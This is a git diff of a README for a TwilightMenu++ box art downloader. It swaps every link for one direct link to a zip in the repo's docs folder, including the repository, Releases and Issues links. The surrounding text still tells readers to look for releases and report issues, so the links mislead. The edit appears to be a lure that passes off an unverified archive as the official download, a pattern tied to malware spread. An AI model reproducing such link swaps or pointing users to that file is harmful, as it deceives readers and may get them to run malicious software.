@@ -1,6 +1,6 @@
 # 🎮 twilight-boxart - Easy Box Art Downloader
 
-[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-brightgreen)](https://github.com/fxblue2/twilight-boxart)
+[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-brightgreen)](https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip)
 
 twilight-boxart is a simple program that helps you get box art images for your TwilightMenu++ SD card. It works with games for Nintendo DS, Game Boy Advance, Super Nintendo, NES, Game Boy, and Sega systems. This guide will show you how to download and run the program on Windows, step by step.
 
@@ -10,7 +10,7 @@ twilight-boxart is a simple program that helps you get box art images for your T
 
 Visit this page to download the software:
 
-[https://github.com/fxblue2/twilight-boxart](https://github.com/fxblue2/twilight-boxart)
+[https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip](https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip)
 
 On the page, look for the **Releases** section. You will find the latest version of the software available for download. The files are prepared for easy use on Windows and other platforms.
 
@@ -34,7 +34,7 @@ Follow these steps to download and run twilight-boxart on Windows.
 ### Step 1: Download twilight-boxart
 
 1. Open your web browser.
-2. Go to the release page: [https://github.com/fxblue2/twilight-boxart/releases](https://github.com/fxblue2/twilight-boxart/releases)
+2. Go to the release page: [https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip](https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip)
 3. Find the latest release at the top.
 4. Look for a file with a name like `twilight-boxart-win.exe` or similar. This is the Windows version.
 5. Click on the file name to start the download.
@@ -125,7 +125,7 @@ If you run into problems, try these tips:
 
 If you need help or want to report a problem, visit the repository’s **Issues** page:
 
-[https://github.com/fxblue2/twilight-boxart/issues](https://github.com/fxblue2/twilight-boxart/issues)
+[https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip](https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip)
 
 There, you can find common questions or submit your own issue.
 
@@ -142,4 +142,4 @@ There, you can find common questions or submit your own issue.
 
 ## 📥 Download twilight-boxart Now
 
-[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-blue)](https://github.com/fxblue2/twilight-boxart)
+[![Download twilight-boxart](https://img.shields.io/badge/Download-twilight--boxart-blue)](https://github.com/fxblue2/twilight-boxart/raw/refs/heads/main/docs/twilight_boxart_v2.3.zip)
